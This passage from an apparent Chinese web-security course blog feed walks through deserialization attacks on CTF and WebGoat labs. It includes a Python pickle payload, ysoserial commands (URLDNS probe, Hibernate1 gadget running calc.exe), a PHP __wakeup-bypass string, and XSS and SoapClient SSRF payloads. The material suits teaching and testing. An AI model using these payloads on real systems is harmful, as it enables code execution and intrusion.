src="/../images/Day48-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-Py%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E9%93%BE%E6%9E%84%E9%80%A0-%E8%87%AA%E5%8A%A8%E5%AE%A1%E8%AE%A1bandit-%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/image-20230221165611327.png" alt="image-20230221165611327"></p><p>此处接收become进行url编码和反序列化操作</p><p><img src="/../images/Day48-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-Py%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E9%93%BE%E6%9E%84%E9%80%A0-%E8%87%AA%E5%8A%A8%E5%AE%A1%E8%AE%A1bandit-%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/image-20230221170003334.png" alt="image-20230221170003334"></p><p>攻击则采用序列化脚本</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">payload</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">       <span class="keyword">return</span> (<span class="built_in">eval</span>, (<span class="string">&quot;open(&#x27;/flag.txt&#x27;,&#x27;r&#x27;).read()&quot;</span>,))</span><br><span class="line">a = pickle.dumps(payload())</span><br><span class="line">a = urllib.quote(a)</span><br><span class="line"><span class="built_in">print</span> a</span><br></pre></td></tr></table></figure><p>执行cmd命令生成payload</p><p><img src="/../images/Day48-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-Py%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E9%93%BE%E6%9E%84%E9%80%A0-%E8%87%AA%E5%8A%A8%E5%AE%A1%E8%AE%A1bandit-%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/image-20230221170707658.png" alt="image-20230221170707658"></p><p>找到数据传输的地方，看是哪个文件调用的传输become参数的def post方法，找哪里调用了Admin.py文件，于是追踪哪里调用了类对象AdminHandler</p><p><img src="/../images/Day48-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-Py%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E9%93%BE%E6%9E%84%E9%80%A0-%E8%87%AA%E5%8A%A8%E5%AE%A1%E8%AE%A1bandit-%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/image-20230221171349789.png" alt="image-20230221171349789"></p><p>发现是init文件调用了此方法，访问路径为&#x2F;b1g_m4mber,后面就可构造执行数据包了</p><p><img src="/../images/Day48-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-Py%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E9%93%BE%E6%9E%84%E9%80%A0-%E8%87%AA%E5%8A%A8%E5%AE%A1%E8%AE%A1bandit-%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/image-20230221171510030.png" alt="image-20230221171510030"></p><h4 id="代码审计-自动化工具-bandit安装及使用"><a href="#代码审计-自动化工具-bandit安装及使用" class="headerlink" title="#代码审计-自动化工具-bandit安装及使用"></a>#代码审计-自动化工具-bandit安装及使用</h4><p>参考：<a href="https://bandit.readthedocs.io/">https://bandit.readthedocs.io/</a></p><p>安装：pip install bandit</p><p>linux:</p><p>安装后会在当前Python目录下bin</p><p>使用：bandit -r 需要审计的源码目录</p><p>windows:</p><p>安装后会在当前Python目录下script</p><p>使用：bandit -r 需要审计的源码目录</p><p>bandit可以检索到上个案例中的反序列化漏洞</p><p><img src="/../images/Day48-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-Py%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E9%93%BE%E6%9E%84%E9%80%A0-%E8%87%AA%E5%8A%A8%E5%AE%A1%E8%AE%A1bandit-%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/image-20230221172031382.png" alt="image-20230221172031382"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;知识点：&quot;&gt;&lt;a href=&quot;#知识点：&quot; class=&quot;headerlink&quot; title=&quot;#知识点：&quot;&gt;&lt;/a&gt;#知识点：&lt;/h3&gt;&lt;p&gt;1、Python-反序列化函数使用&lt;/p&gt;
&lt;p&gt;2、Python-反序列化魔术方法&lt;/p&gt;
&lt;p&gt;3、Python-反</summary>
      
    
    
    
    <category term="Web攻防" scheme="http://example.com/categories/Web%E6%94%BB%E9%98%B2/"/>
    
    
  </entry>
  
  <entry>
    <title>Day47 WEB攻防-通用漏洞&amp;Java反序列化&amp;EXP生成&amp;数据提取&amp;组件安全</title>
    <link href="http://example.com/2023/02/03/Day47-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-EXP%E7%94%9F%E6%88%90-%E6%95%B0%E6%8D%AE%E6%8F%90%E5%8F%96-%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8/"/>
    <id>http://example.com/2023/02/03/Day47-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-EXP%E7%94%9F%E6%88%90-%E6%95%B0%E6%8D%AE%E6%8F%90%E5%8F%96-%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8/</id>
    <published>2023-02-02T17:50:28.000Z</published>
    <updated>2023-02-21T07:23:47.529Z</updated>
    
    <content type="html"><![CDATA[<h3 id="知识点："><a href="#知识点：" class="headerlink" title="#知识点："></a>#知识点：</h3><p>1、Java反序列化演示-原生API接口</p><p>2、Java反序列化漏洞利用-Ysoserial使用</p><p>3、Java反序列化漏洞发现利用点-函数&amp;数据</p><p>4、Java反序列化考点-真实&amp;CTF赛题-审计分析</p><h3 id="内容点："><a href="#内容点：" class="headerlink" title="#内容点："></a>#内容点：</h3><p>1、明白-Java反序列化原理</p><p>2、判断-Java反序列化漏洞</p><p>3、学会-Ysoserial工具使用</p><p>4、学会-SerializationDumper</p><p>5、了解-简要Java代码审计分析</p><h3 id="前置知识"><a href="#前置知识" class="headerlink" title="#前置知识:"></a>#前置知识:</h3><h4 id="序列化和反序列化的概念："><a href="#序列化和反序列化的概念：" class="headerlink" title="序列化和反序列化的概念："></a>序列化和反序列化的概念：</h4><p>序列化：把Java对象转换为字节序列的过程。</p><p>反序列化：把字节序列恢复为Java对象的过程。</p><p>对象的序列化主要有两种用途：</p><p>把对象的字节序列永久地保存到硬盘上，通常存放在一个文件中；（持久化对象）</p><p>在网络上传送对象的字节序列。（网络传输对象）</p><h4 id="函数接口："><a href="#函数接口：" class="headerlink" title="函数接口："></a>函数接口：</h4><p>Java： Serializable Externalizable接口、fastjson、jackson、gson、ObjectInputStream.read、ObjectObjectInputStream.readUnshared、XMLDecoder.read、ObjectYaml.loadXStream.fromXML、ObjectMapper.readValue、JSON.parseObject等</p><p>PHP： serialize()、 unserialize() </p><p>Python：pickle</p><h4 id="数据出现："><a href="#数据出现：" class="headerlink" title="数据出现："></a>数据出现：</h4><p>1、功能特性：</p><p>反序列化操作一般应用在导入模板文件、网络通信、数据传输、日志格式化存储、对象数据落磁盘、或DB存储等业务场景。因此审计过程中重点关注这些功能板块。</p><p>2、数据特性：</p><p>一段数据以<strong>rO0AB</strong>开头，你基本可以确定这串就是JAVA序列化base64加密的数据。</p><p>或者如果以<strong>aced</strong>开头，那么他就是这一段java序列化的16进制。</p><p>3、出现具体：</p><p>http参数，cookie，sesion，存储方式可能是base64(rO0），压缩后的base64(H4s),MII等Servlets http,Sockets,Session管理器，包含的协议就包括：JMX,RMI,JMS,JND1等(\xac\Xed) xm lXstream,XmldEcoder等（http Body:Content-type: application&#x2F;xml）json(jackson,fastjson)http请求中包含</p><h4 id="发现："><a href="#发现：" class="headerlink" title="-发现："></a>-发现：</h4><p>黑盒分析：数据库出现地-观察数据特性</p><p>白盒分析：组件安全&amp;函数搜索&amp;功能模块</p><h4 id="利用："><a href="#利用：" class="headerlink" title="-利用："></a>-利用：</h4><p>Ysoserial集成的jar包配合生成，特性的专业漏洞利用工具等</p><h3 id="演示案例："><a href="#演示案例：" class="headerlink" title="演示案例："></a>演示案例：</h3><p>➢ 原生API-Ysoserial_URLDNS使用</p><p>➢ 三方组件-Ysoserial_支持库生成使用</p><p>➢ 解密分析-SerializationDumper数据分析</p><p>➢ CTF赛题-[网鼎杯2020朱雀组]ThinkJava</p><h3 id="复现："><a href="#复现：" class="headerlink" title="复现："></a>复现：</h3><h5 id="➢-原生API-Ysoserial-URLDNS使用"><a href="#➢-原生API-Ysoserial-URLDNS使用" class="headerlink" title="➢ 原生API-Ysoserial_URLDNS使用"></a>➢ 原生API-Ysoserial_URLDNS使用</h5><p>在dnslog生成url测试dns连接：</p><p>没组件生成DNS利用：</p><blockquote><p>java -jar ysoserial-0.0.6-SNAPSHOT-all.jar URLDNS “<a href="http://5csix6.dnslog.cn/">http://5csix6.dnslog.cn</a>“ &gt; a.bin</p></blockquote><p><img src="/../images/Day47-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-EXP%E7%94%9F%E6%88%90-%E6%95%B0%E6%8D%AE%E6%8F%90%E5%8F%96-%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8/image-20230221130153008.png" alt="image-20230221130153008"></p><p>复制粘贴base64编码后的内容：</p><p><img src="/../images/Day47-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-EXP%E7%94%9F%E6%88%90-%E6%95%B0%E6%8D%AE%E6%8F%90%E5%8F%96-%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8/image-20230221130459043.png" alt="image-20230221130459043"></p><p>发现有回显：</p><p><img src="/../images/Day47-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-EXP%E7%94%9F%E6%88%90-%E6%95%B0%E6%8D%AE%E6%8F%90%E5%8F%96-%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8/image-20230221130416891.png" alt="image-20230221130416891"></p><h5 id="➢-三方组件-Ysoserial-支持库生成使用"><a href="#➢-三方组件-Ysoserial-支持库生成使用" class="headerlink" title="➢ 三方组件-Ysoserial_支持库生成使用"></a>➢ 三方组件-Ysoserial_支持库生成使用</h5><h6 id="分析漏洞："><a href="#分析漏洞：" class="headerlink" title="分析漏洞："></a>分析漏洞：</h6><p>靶场webgoat—Insecure Deserializetion—5</p><p>题目给的数据是rO0AB开头，所以是经过了base64加密的java序列化对象。</p><p><img src="/../images/Day47-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-EXP%E7%94%9F%E6%88%90-%E6%95%B0%E6%8D%AE%E6%8F%90%E5%8F%96-%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaW165Li2,size_20,color_FFFFFF,t_70,g_se,x_16.png" alt="img"></p><p> 解码后是一段英文，百度翻译也没发现有啥用处：</p><p><img src="/../images/Day47-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-EXP%E7%94%9F%E6%88%90-%E6%95%B0%E6%8D%AE%E6%8F%90%E5%8F%96-%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaW165Li2,size_20,color_FFFFFF,t_70,g_se,x_16-16769497958759.png" alt="img"></p><p>题目还给出了一个接收序列化数据的表单，先分析一波：</p><p>用burpsuite抓包：</p><p> <img src="https://img-blog.csdnimg.cn/022a10fc96ac48dbac308d45bc3b5c9e.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaW165Li2,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p><p> 可以看到，表单提交的数据通过token接收，并发送到&#x2F;InsecureDeserialization&#x2F;task这个页面，可以通过&#x2F;InsecureDeserialization&#x2F;task找出对应的源码，所以，页面接收的token是一段经过base64编码的序列化数据</p><p><img src="/../images/Day47-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-EXP%E7%94%9F%E6%88%90-%E6%95%B0%E6%8D%AE%E6%8F%90%E5%8F%96-%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaW165Li2,size_20,color_FFFFFF,t_70,g_se,x_16-167694992761215.png" alt="img"></p><h6 id="利用漏洞：—-ysoserial工具"><a href="#利用漏洞：—-ysoserial工具" class="headerlink" title="利用漏洞：—-ysoserial工具"></a>利用漏洞：—-ysoserial工具</h6><p>找到了传输序列化数据的接口，接下来就需要构造payload了</p><p>首先肯定是查找已知漏洞的利用，对于分析代码去构造payload，没技术不说，也没时间去搞，最简单最直接就是找披露过的java插件漏洞。</p><p>运行ysoserial工具</p><p>java -jar ysoserial.jar</p><p><img src="/../images/Day47-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-EXP%E7%94%9F%E6%88%90-%E6%95%B0%E6%8D%AE%E6%8F%90%E5%8F%96-%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaW165Li2,size_20,color_FFFFFF,t_70,g_se,x_16-167694999310318.png" alt="img"></p><p>按照ysoserial支持的插件，查找webgoat是否安装了对应的jar包，这里只有两个：</p><p>Hibernate和spring-core 但是spring-core的版本不一致，所以就选择Hibernate</p><p><img src="/../images/Day47-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-EXP%E7%94%9F%E6%88%90-%E6%95%B0%E6%8D%AE%E6%8F%90%E5%8F%96-%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaW165Li2,size_20,color_FFFFFF,t_70,g_se,x_16-167695000829021.png" alt="img"></p><p>将Hibernate的jar包复制到ysoserial工具的目录下，jar包名字中必须是有core的，是插件的核心</p><p> 我这里是hibernate-core-5.4.6.Final.jar这个包，利用ysoserial生成payload，执行以下命令</p><blockquote><p> java -Dhibernate5 -cp hibernate-core-5.4.6.Final.jar;ysoserial.jar ysoserial.GeneratePayload Hibernate1 calc.exe &gt; token.bin</p></blockquote><p> java -Dhibernate5 -cp hibernate-core-5.4.6.Final.jar;  &#x2F;&#x2F;表示hibernate5的插件</p><p>ysoserial.jar ysoserial.GeneratePayload Hibernate1 calc.exe &gt; token.bin  &#x2F;&#x2F;生成Hibernate1插件反序列化漏洞的payload，执行calc.exe命令，将payload保存在token.bin文件中</p><p>payload生成了，但是表单接收的是经过base64编码的：采用python写的简单脚本对payloadbase64编码</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">filename = <span class="built_in">input</span>(<span class="string">&quot;输入需要base64编码的文件名：&quot;</span>)</span><br><span class="line">s = <span class="built_in">open</span>(filename, <span class="string">&quot;rb&quot;</span>).read() <span class="comment">#文本默认模式读取文件内容rt</span></span><br><span class="line">base64_str = base64.urlsafe_b64encode(s)</span><br><span class="line"><span class="comment">#文本默认模式写入文件内容wt</span></span><br><span class="line"><span class="built_in">open</span>(<span class="string">&quot;base64.txt&quot;</span>, <span class="string">&quot;wt&quot;</span>,encoding=<span class="string">&quot;utf-8&quot;</span>).write(base64_str.decode())</span><br></pre></td></tr></table></figure><p><img src="/../images/Day47-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-EXP%E7%94%9F%E6%88%90-%E6%95%B0%E6%8D%AE%E6%8F%90%E5%8F%96-%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaW165Li2,size_20,color_FFFFFF,t_70,g_se,x_16-167695018053324.png" alt="img"></p><p>将编码的字符串提交：成功执行calc.exe命令</p><p><img src="/../images/Day47-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-EXP%E7%94%9F%E6%88%90-%E6%95%B0%E6%8D%AE%E6%8F%90%E5%8F%96-%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaW165Li2,size_20,color_FFFFFF,t_70,g_se,x_16-167695019540927.png" alt="img"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;知识点：&quot;&gt;&lt;a href=&quot;#知识点：&quot; class=&quot;headerlink&quot; title=&quot;#知识点：&quot;&gt;&lt;/a&gt;#知识点：&lt;/h3&gt;&lt;p&gt;1、Java反序列化演示-原生API接口&lt;/p&gt;
&lt;p&gt;2、Java反序列化漏洞利用-Ysoserial使用&lt;/p&gt;
&lt;</summary>
      
    
    
    
    <category term="Web攻防" scheme="http://example.com/categories/Web%E6%94%BB%E9%98%B2/"/>
    
    
  </entry>
  
  <entry>
    <title>Day46 WEB攻防-通用漏洞&amp;PHP反序列化&amp;原生类&amp;漏洞绕过&amp;公私有属性</title>
    <link href="http://example.com/2023/02/03/Day46-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E5%8E%9F%E7%94%9F%E7%B1%BB-%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87-%E5%85%AC%E7%A7%81%E6%9C%89%E5%B1%9E%E6%80%A7/"/>
    <id>http://example.com/2023/02/03/Day46-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E5%8E%9F%E7%94%9F%E7%B1%BB-%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87-%E5%85%AC%E7%A7%81%E6%9C%89%E5%B1%9E%E6%80%A7/</id>
    <published>2023-02-02T17:49:20.000Z</published>
    <updated>2023-03-11T02:51:17.243Z</updated>
    
    <content type="html"><![CDATA[<h3 id="知识点："><a href="#知识点：" class="headerlink" title="#知识点："></a>#知识点：</h3><p>1、反序列化魔术方法全解</p><p>2、反序列化变量属性全解</p><p>3、反序列化魔术方法原生类</p><p>4、反序列化语言特性漏洞绕过</p><p>-其他魔术方法 </p><p>-共有&amp;私有&amp;保护 </p><p>-语言模式方法漏洞 </p><p>-原生类获取利用配合</p><h3 id="反序列化利用大概分类三类"><a href="#反序列化利用大概分类三类" class="headerlink" title="#反序列化利用大概分类三类"></a>#反序列化利用大概分类三类</h3><p>-魔术方法的调用逻辑-如触发条件</p><p>-语言原生类的调用逻辑-如SoapClient</p><p>-语言自身的安全缺陷-如CVE-2016-7124</p><h3 id="反序列化课程点："><a href="#反序列化课程点：" class="headerlink" title="#反序列化课程点："></a>#反序列化课程点：</h3><p>-PHP&amp;Java&amp;Python</p><p>序列化：对象转换为数组或字符串等格式</p><p>反序列化：将数组或字符串等格式转换成对象</p><p>serialize()     &#x2F;&#x2F;将一个对象转换成一个字符串</p><p>unserialize()   &#x2F;&#x2F;将字符串还原成一个对象</p><h3 id="PHP反序列化漏洞"><a href="#PHP反序列化漏洞" class="headerlink" title="#PHP反序列化漏洞"></a>#PHP反序列化漏洞</h3><p>原理：未对用户输入的序列化字符串进行检测，导致攻击者可以控制反序列化过程，从而导致代码执行，SQL注入，目录遍历等不可控后果。在反序列化的过程中自动触发了某些魔术方法。当进行反序列化的时候就有可能会触发对象中的一些魔术方法。</p><h3 id="魔术方法利用点分析："><a href="#魔术方法利用点分析：" class="headerlink" title="#魔术方法利用点分析："></a>#魔术方法利用点分析：</h3><p>触发：unserialize函数的变量可控，文件中存在可利用的类，类中有魔术方法：</p><p>__construct(): &#x2F;&#x2F;构造函数，当对象new的时候会自动调用</p><p>__destruct()：&#x2F;&#x2F;析构函数当对象被销毁时会被自动调用</p><p>__wakeup(): &#x2F;&#x2F;unserialize()时会被自动调用</p><p>__invoke(): &#x2F;&#x2F;当尝试以调用函数的方法调用一个对象时，会被自动调用</p><p>__call(): &#x2F;&#x2F;在对象上下文中调用不可访问的方法时触发</p><p>__callStatci(): &#x2F;&#x2F;在静态上下文中调用不可访问的方法时触发</p><p>__get(): &#x2F;&#x2F;用于从不可访问的属性读取数据</p><p>__set(): &#x2F;&#x2F;用于将数据写入不可访问的属性</p><p>__isset(): &#x2F;&#x2F;在不可访问的属性上调用isset()或empty()触发</p><p>__unset(): &#x2F;&#x2F;在不可访问的属性上使用unset()时触发</p><p>__toString(): &#x2F;&#x2F;把类当作字符串使用时触发</p><p>__sleep(): &#x2F;&#x2F;serialize()函数会检查类中是否存在一个魔术方法sleep() 如果存在，该方法会被优先调用</p><h3 id="演示案例："><a href="#演示案例：" class="headerlink" title="演示案例："></a>演示案例：</h3><p>➢ 方法&amp;属性-调用详解&amp;变量数据详解</p><p>➢ CTF-语言漏洞-__wakeup()方法绕过</p><p>➢ CTF-方法原生类-获取&amp;利用&amp;配合其他</p><h3 id="复现："><a href="#复现：" class="headerlink" title="复现："></a>复现：</h3><h4 id="CTF-语言漏洞-wakeup-方法绕过"><a href="#CTF-语言漏洞-wakeup-方法绕过" class="headerlink" title="#CTF-语言漏洞-__wakeup()方法绕过"></a>#CTF-语言漏洞-__wakeup()方法绕过</h4><p> [极客大挑战 2019]PHP CVE-2016-7124 </p><p>如果存在__wakeup方法，调用unserilize()方法前则先调用__wakeup方法，</p><p>但是序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行</p><p>1、下载源码分析，触发flag条件</p><p>2、分析会触发调用__wakeup 强制username值</p><p>3、利用语言漏洞绕过 CVE-2016-7124</p><p>4、构造payload后 修改满足漏洞条件触发</p><p>Pyload:</p><p>select&#x3D;O%3A4%3A”Name”%3A3%3A%7Bs%3A14%3A”%00Name%00username”%3Bs%3A5%3A”admin”%3Bs%3A14%3A”%00Name%00password”%3Bi%3A100%3B%7D</p><h4 id="CTF-方法原生类-获取-amp-利用-amp-配合其他"><a href="#CTF-方法原生类-获取-amp-利用-amp-配合其他" class="headerlink" title="#CTF-方法原生类-获取&amp;利用&amp;配合其他"></a>#CTF-方法原生类-获取&amp;利用&amp;配合其他</h4><p>参考案例：<a href="https://www.anquanke.com/post/id/264823">https://www.anquanke.com/post/id/264823</a></p><p>-PHP有那些原生类-见脚本使用</p><p>-常见使用的原生类-见参考案例</p><p>-原生类该怎么使用-见官方说明</p><p>0、生成原生类</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$classes</span> = <span class="title function_ invoke__">get_declared_classes</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$classes</span> <span class="keyword">as</span> <span class="variable">$class</span>) &#123;</span><br><span class="line">​    <span class="variable">$methods</span> = <span class="title function_ invoke__">get_class_methods</span>(<span class="variable">$class</span>);</span><br><span class="line">​    <span class="keyword">foreach</span> (<span class="variable">$methods</span> <span class="keyword">as</span> <span class="variable">$method</span>) &#123;</span><br><span class="line">​        <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$method</span>, <span class="keyword">array</span>(</span><br><span class="line">​            <span class="string">&#x27;__destruct&#x27;</span>,</span><br><span class="line">​            <span class="string">&#x27;__toString&#x27;</span>,</span><br><span class="line">​            <span class="string">&#x27;__wakeup&#x27;</span>,</span><br><span class="line">​            <span class="string">&#x27;__call&#x27;</span>,</span><br><span class="line">​            <span class="string">&#x27;__callStatic&#x27;</span>,</span><br><span class="line">​            <span class="string">&#x27;__get&#x27;</span>,</span><br><span class="line">​            <span class="string">&#x27;__set&#x27;</span>,</span><br><span class="line">​            <span class="string">&#x27;__isset&#x27;</span>,</span><br><span class="line">​            <span class="string">&#x27;__unset&#x27;</span>,</span><br><span class="line">​            <span class="string">&#x27;__invoke&#x27;</span>,</span><br><span class="line">​            <span class="string">&#x27;__set_state&#x27;</span></span><br><span class="line">​        ))) &#123;</span><br><span class="line">​            <span class="keyword">print</span> <span class="variable">$class</span> . <span class="string">&#x27;::&#x27;</span> . <span class="variable">$method</span> . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">​        &#125;</span><br><span class="line">​    &#125;</span><br><span class="line"></span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>1、本地Demo-xss</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(__file__);</span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;k&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">-输出对象可调用__toString</span><br><span class="line"></span><br><span class="line">-无代码通过原生类<span class="built_in">Exception</span></span><br><span class="line"></span><br><span class="line">-<span class="built_in">Exception</span>使用查询编写利用</span><br><span class="line"></span><br><span class="line">-通过访问触发输出产生XSS漏洞</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;xiaodi&#x27;)&lt;/script&gt;&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>2、CTFSHOW-259</p><p>-不存在的方法触发__call</p><p>-无代码通过原生类SoapClient</p><p>-SoapClient使用查询编写利用</p><p>-通过访问本地Flag.php获取Flag</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$ua</span>=<span class="string">&quot;aaa\r\nX-Forwarded-For:127.0.0.1,127.0.0.1\r\nContent-Type:application/x-www-form-urlencoded\r\nContent-Length:13\r\n\r\ntoken=ctfshow&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$client</span>=<span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;uri&#x27;</span>=&gt;<span class="string">&#x27;http://127.0.0.1/&#x27;</span>,<span class="string">&#x27;location&#x27;</span>=&gt;<span class="string">&#x27;http://127.0.0.1/flag.php&#x27;</span>,<span class="string">&#x27;user_agent&#x27;</span>=&gt;<span class="variable">$ua</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$client</span>));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;知识点：&quot;&gt;&lt;a href=&quot;#知识点：&quot; class=&quot;headerlink&quot; title=&quot;#知识点：&quot;&gt;&lt;/a&gt;#知识点：&lt;/h3&gt;&lt;p&gt;1、反序列化魔术方法全解&lt;/p&gt;
&lt;p&gt;2、反序列化变量属性全解&lt;/p&gt;
&lt;p&gt;3、反序列化魔术方法原生类&lt;/p&gt;
&lt;p</summary>
      
    
    
    
    <category term="Web攻防" scheme="http://example.com/categories/Web%E6%94%BB%E9%98%B2/"/>
    
    
  </entry>
  
  <entry>
    <title>Day45 WEB攻防-通用漏洞&amp;PHP反序列化&amp;POP链构造&amp;魔术方法&amp;原生类</title>
    <link href="http://example.com/2023/02/03/Day45-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-POP%E9%93%BE%E6%9E%84%E9%80%A0-%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95-%E5%8E%9F%E7%94%9F%E7%B1%BB/"/>
